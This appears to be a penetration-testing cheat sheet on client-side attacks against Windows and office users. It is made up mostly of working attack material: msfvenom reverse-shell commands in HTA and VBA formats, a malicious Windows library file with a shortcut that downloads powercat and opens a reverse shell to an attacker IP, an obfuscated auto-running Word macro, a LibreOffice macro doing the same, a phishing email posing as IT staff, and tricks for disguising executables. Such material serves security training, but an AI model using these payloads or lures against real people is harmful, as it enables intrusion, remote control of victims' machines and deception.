### http application attack(works against Internet Explorer and to some extent Microsoft Edge)
```
1. msfvenom -p windows/shell_reverse_tcp(windows/x64/shell_reverse_tcp,windows/x64/meterpreter/reverse_tcp) LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o evil.hta
```

### office word macro development(vba script)
```
1. msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.4 LPORT=4444 -f vba -o evil
2. open word document and edit macro, copy paste then save as doc,docm
3. open a listener
```

### Evading Protected View
>This Microsoft Word document is highly effective when served locally, but when served from the Internet, say through an email or a download link, we must bypass another layer of protection known as Protected View,1 which disables all editing and modifications in the document and blocks the execution of macros or embedded objects.

### Windows library files
```
kali:
pip3 install wsgidav
mkdir /home/kali/webdav
touch /home/kali/webdav/test.txt
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/

Windows:
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.2(LHOST)</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
Save as config.Library-ms

Create .Ink shotcut file with command:
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');powercat -c 192.168.119.3 -p 4444 -e powershell"
Save as automatic_configuration,put it in Lhost's webdav folder

Delivery config.Library-ms via email for triggering victim to click short link:

Hello! My name is Dwight, and I'm a new member of the IT Team.

This week I am completing some configurations we rolled out last week.
To make this easier, I've attached a file that will automatically
perform each step. Could you download the attachment, open the
directory, and double-click "automatic_configuration"? Once you
confirm the configuration in the window that appears, you're all done!

If you have any questions, or run into any problems, please let me
know!

Lhost: nc -nlvp 4444
Lhost: python3 -m http.server
```
![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/ddb6330f-410c-4fd5-ad65-0baf3f7e9a96)

### Office Macro Using Powershell base64 encoded reverse shell
1. Original Powershell Payload
```
IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.181:8000/powercat.ps1');powercat -c 192.168.45.181 -p 4444 -e powershell
```
2.![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/1d716a30-3a3b-423a-bc1e-c0c3c346240e)
3. Using python to split and concatenate
```
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
n = 50
for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```
4. Copy Macro script and convince victim to enable content
```
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ...
        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
End Sub
```
### Change exe file ico
ResourceHacker
![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/3560e67b-fdc4-44c5-995a-86e000b73f8b)
![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/851d0cee-37ef-404d-8639-a2c9410fac59)


### Use RLO change file extension from exe into jpg
![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/01bc9bde-67d9-46ec-8776-6a29bec48bed)
![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/3a1260b7-3772-45f6-9f7f-1ea501814662)

### Libreoffice payload
```
REM  *****  BASIC  *****

Sub Main

	 Shell("cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.166:8000/powercat.ps1');powercat -c 192.168.45.166 -p 80 -e powershell")

End Sub
```
```
Tools -> Options -> Security -> Macrosecurity -> Low  
Tools -> Customize -> OpenDocument -> Assign Macro
Tools -> Macro -> Organize Macro -> Basic -> choose the file -> New -> NewModuleName
Save as odt file
```
